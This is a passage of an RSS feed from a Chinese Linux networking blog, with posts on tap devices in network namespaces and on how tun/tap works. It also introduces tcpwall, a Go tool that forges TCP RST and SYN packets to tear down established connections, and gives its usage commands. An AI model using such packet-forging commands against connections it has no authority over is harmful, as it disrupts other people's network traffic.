&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="开始实验">开始实验&lt;/h3>
&lt;p>我们将要构建如下图的网络&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/netns.png?t=2" alt="https://oss.typesafe.cn/netns.png">&lt;/p>
&lt;p>首先我们添加两个tap设备并配置上IP信息，然后添加两个netns，最后将tap设备移动到netns中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 添加并启动虚拟网卡tap设备&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip tuntap add dev tap0 mode tap 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip tuntap add dev tap1 mode tap 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> tap0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> tap1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 配置IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip addr add 10.0.0.1/24 dev tap0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip addr add 10.0.0.2/24 dev tap1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 添加netns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># 将虚拟网卡tap0，tap1分别移动到ns0和ns1中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> tap0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> tap1 netns ns1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在宿主机器上使用&lt;code>ping 10.0.0.1&lt;/code>测试与tap0的网络连通性&lt;/p></description></item><item><title>深入理解 Linux 虚拟网络设备 tun/tap</title><link>https://www.typesafe.cn/posts/linux-tun-tap/</link><pubDate>Sun, 08 Nov 2020 22:11:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-tun-tap/</guid><description>&lt;p>在探索Linux网络虚拟化的世界时，你一定会遇到tun和tap这两个关键概念。它们是理解VPN、虚拟机网络、容器网络等技术的基础。本文将带你深入了解tun/tap是什么，它们是如何工作的，以及如何在实践中使用它们。&lt;/p>
&lt;blockquote>
&lt;p>在计算机网络中，&lt;strong>tun&lt;/strong>与&lt;strong>tap&lt;/strong>是操作系统内核中的虚拟网络设备。不同于普通靠硬件网络适配器实现的设备，这些虚拟的网络设备全部用软件实现，并向运行于操作系统上的软件提供与硬件的网络设备完全相同的功能。&lt;/p>&lt;/blockquote>
&lt;h3 id="tuntap是什么">tun/tap是什么？&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>tun&lt;/strong> (tunnel的缩写) 是一个虚拟的点对点网络设备，工作在网络层（OSI模型的第三层）。它处理的是IP数据包，所以你可以把它看作是一个虚拟的网卡，但它没有物理的MAC地址。tun设备常用于实现各种IP隧道，例如OpenVPN和IPSec。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>tap&lt;/strong> (network tap的缩写) 是一个虚拟的以太网设备，工作在数据链路层（OSI模型的第二层）。它处理的是以太网帧，因此它拥有一个MAC地址，行为上更像一个真实的以太网卡。tap设备最常见的用途是作为虚拟机的网卡（如QEMU/KVM），或者用于创建网络桥接，将虚拟机接入物理局域网。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="tuntap-的工作原理">tun/tap 的工作原理&lt;/h3>
&lt;p>Linux中的tun/tap设备提供了一种能力，让用户空间的应用程序能够像读写文件一样，直接向内核网络协议栈注入数据包，或者从协议栈中接收数据包。&lt;/p>
&lt;p>操作tun/tap设备主要通过一个特殊的字符设备文件 &lt;code>/dev/net/tun&lt;/code>。当一个应用程序打开这个文件时，内核会创建一个与该文件描述符关联的虚拟网络接口（如 &lt;code>tun0&lt;/code> 或 &lt;code>tap0&lt;/code>）。&lt;/p>
&lt;p>数据流动的过程可以用下图来概括：&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-mermaid" data-lang="mermaid">graph TD
 subgraph &amp;#34;用户空间 (User Space)&amp;#34;
 App(&amp;#34;应用程序 (e.g., VPN, QEMU)&amp;#34;)
 end

 subgraph &amp;#34;内核空间 (Kernel Space)&amp;#34;
 DevFile(&amp;#34;/dev/net/tun&amp;#34;)
 Driver(&amp;#34;TUN/TAP 驱动&amp;#34;)
 NetStack(&amp;#34;网络协议栈&amp;#34;)
 PhyDriver(&amp;#34;物理网卡驱动&amp;#34;)
 end
 
 PHY(&amp;#34;物理网卡&amp;#34;)

 App &amp;lt;--&amp;gt;|经由文件描述符&amp;lt;br/&amp;gt;read()/write()| DevFile
 DevFile &amp;lt;--&amp;gt; Driver
 Driver &amp;lt;--&amp;gt; NetStack
 NetStack &amp;lt;--&amp;gt; PhyDriver
 PhyDriver &amp;lt;--&amp;gt; PHY
&lt;/code>&lt;/pre>&lt;p>&lt;strong>数据发送流程 (Outbound):&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>用户空间的应用程序（例如VPN客户端）通过文件描述符向 &lt;code>/dev/net/tun&lt;/code> 写入一个IP包（对于tun设备）或以太网帧（对于tap设备）。&lt;/li>
&lt;li>tun/tap驱动接收到数据，并将其作为一个数据包注入到内核网络协议栈中，就像数据是从一个真实的物理网卡传来一样。&lt;/li>
&lt;li>网络协议栈根据其路由表等信息对数据包进行处理（例如，路由选择、NAT转换）。&lt;/li>
&lt;li>最终，协议栈将数据包通过真实的物理网卡发送出去。&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>数据接收流程 (Inbound):&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>物理网卡接收到一个数据包。&lt;/li>
&lt;li>内核网络协议栈处理这个数据包。&lt;/li>
&lt;li>如果路由规则指示这个数据包应该被发送到tun/tap虚拟接口，协议栈就会将它交给tun/tap驱动。&lt;/li>
&lt;li>驱动程序将该数据包放入一个队列，等待用户空间的应用程序通过文件描述符从 &lt;code>/dev/net/tun&lt;/code> 中读取。&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>&lt;strong>注意&lt;/strong>：当应用程序关闭该文件描述符时，对应的虚拟网络接口以及相关的路由等信息也会被内核自动删除。&lt;/p></description></item><item><title>tcpkill在go语言下的实现和增强</title><link>https://www.typesafe.cn/posts/tcpwall/</link><pubDate>Sat, 31 Oct 2020 00:00:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/tcpwall/</guid><description>&lt;h2 id="tcpwall">tcpwall&lt;/h2>
&lt;p>当我们想要阻止某些TCP连接的建立，在Linux平台上有一个很好的解决方案&lt;strong>iptables&lt;/strong>，但是对那些已经建立的tcp连接，iptables就不能做到随心所欲的阻断了。&lt;/p>
&lt;p>我在互联网上检索的时候发现了&lt;strong>tcpkill&lt;/strong>这个工具，tcpkill是一个网络分析工具集&lt;strong>dsniff&lt;/strong>中的一个小工具。在Linux上可以直接通过dsniff包安装，使用方式也非常简单。&lt;/p>
&lt;p>通过测试我发现tcpkill在执行命令之后并不会立刻阻断tcp连接，而是等待有数据传输时，才会阻断，因此在执行完命令之后程序并不会主动退出，而是需要通过&lt;em>&lt;strong>Ctrl+C&lt;/strong>&lt;/em>来退出，这对于某些想要通过程序来调用的脚本小子（例如我）来说简直是个灾难。&lt;/p>
&lt;h2 id="如何阻断一个已经建立的tcp连接">如何阻断一个已经建立的tcp连接？&lt;/h2>
&lt;p>阻断一个已经建立的tcp连接通常有这几种方案：&lt;/p>
&lt;ol>
&lt;li>服务端主动断开&lt;/li>
&lt;li>客户端主动断开&lt;/li>
&lt;li>拔掉网线（时间要超过tcp超时时间）&lt;/li>
&lt;li>伪造RST数据包发送给服务端和客户端让它们主动断开（tcpkill就是这么做的）&lt;/li>
&lt;/ol>
&lt;p>前三种局限性太大，只能用第4种了。&lt;/p>
&lt;h2 id="如何实现伪造rst数据报文包">如何实现伪造RST数据报文包？&lt;/h2>
&lt;p>&lt;a href="https://github.com/google/gopacket">GoPacket&lt;/a> 是go基于&lt;strong>libpcap&lt;/strong>构建的一个库，可以通过旁路的方式接收一份数据包的拷贝。因此我们可以很方便捕获到正在通信的tcp数据报文。通过数据报文，我们可以获取到通信双方的MAC地址，IP和端口号，以及ACK号等，这些都是伪造数据包必不可少的。&lt;/p>
&lt;p>在学习了&lt;strong>tcpkill&lt;/strong>的源码之后，我使用go开发了一个增强版的&lt;strong>tcpwall&lt;/strong>，&lt;strong>tcpwall&lt;/strong>不仅可以实现和&lt;strong>tcpkill&lt;/strong>同样的基于ip或端口监听到指定数据报文之后伪造RST数据报文来阻断tcp连接，也可以通过源ip源端口，目的ip目的端口来主动发送SYN数据报文包来诱导那些没有数据的tcp连接发送ACK数据报文包以获取源MAC、目的MAC和ACK号，并且可以通过指定参数让程序等待一段时间后主动退出。&lt;/p>
&lt;h2 id="如何使用">如何使用&lt;/h2>
&lt;p>阻断指定IP和端口的TCP连接（不关心是源或者目的）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#ff79c6">{&lt;/span>interface&lt;span style="color:#ff79c6">}&lt;/span> -host &lt;span style="color:#ff79c6">{&lt;/span>host&lt;span style="color:#ff79c6">}&lt;/span> -port &lt;span style="color:#ff79c6">{&lt;/span>port&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>阻断指定源IP和源端口的TCP连接&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#ff79c6">{&lt;/span>interface&lt;span style="color:#ff79c6">}&lt;/span> -shost &lt;span style="color:#ff79c6">{&lt;/span>src_host&lt;span style="color:#ff79c6">}&lt;/span> -sport &lt;span style="color:#ff79c6">{&lt;/span>src_port&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>阻断指定目的IP和目的端口的TCP连接&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#ff79c6">{&lt;/span>interface&lt;span style="color:#ff79c6">}&lt;/span> -dhost &lt;span style="color:#ff79c6">{&lt;/span>dst_host&lt;span style="color:#ff79c6">}&lt;/span> -dport &lt;span style="color:#ff79c6">{&lt;/span>dst_port&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>阻断指定源IP、源端口、目的IP、目的端口的TCP连接（会主动向双方发送SYN数据报文包）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#ff79c6">{&lt;/span>interface&lt;span style="color:#ff79c6">}&lt;/span> -shost &lt;span style="color:#ff79c6">{&lt;/span>src_host&lt;span style="color:#ff79c6">}&lt;/span> -sport &lt;span style="color:#ff79c6">{&lt;/span>src_port&lt;span style="color:#ff79c6">}&lt;/span> -dhost &lt;span style="color:#ff79c6">{&lt;/span>dst_host&lt;span style="color:#ff79c6">}&lt;/span> -dport &lt;span style="color:#ff79c6">{&lt;/span>dst_port&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="其他">其他&lt;/h2>
&lt;ul>
&lt;li>-timeout 时间（秒）指定等待多久之后退出程序&lt;/li>
&lt;/ul>
&lt;p>项目地址 &lt;a href="https://github.com/dushixiang/tcpwall">https://github.com/dushixiang/tcpwall&lt;/a>&lt;/p></description></item></channel></rss>